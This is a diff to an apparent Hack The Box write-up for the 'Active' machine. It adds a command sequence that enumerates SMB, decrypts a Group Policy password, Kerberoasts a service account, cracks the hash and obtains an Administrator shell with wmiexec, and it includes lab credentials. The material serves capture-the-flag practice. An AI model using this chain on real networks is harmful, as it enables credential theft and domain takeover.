@@ -1,4 +1,15 @@
 ```
+enum4linux 10.10.10.100
+smbclient \\\\10.10.10.100\\Replication
+gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ
+ldapsearch -x -b "dc=active,dc=htb" -H ldap://10.10.10.100 -D SVC_TGS -w GPPstillStandingStrong2k18 > ldapsearch.txt
+./GetUserSPNs.py active.htb/SVC_TGS -dc-ip 10.10.10.100 –request
+john hash_admin -w=/usr/share/wordlists/rockyou.txt
+./wmiexec.py 'active/Administrator:Ticketmaster1968@10.10.10.100'
+```
+
+
+```
 nmap -sS -sC -sV -T5 -Pn 10.10.10.100
 ```
 ![image](https://github.com/regarmulia/HTB/assets/33616880/62eec5e6-380c-45c5-bc44-3bdb54c40f26)
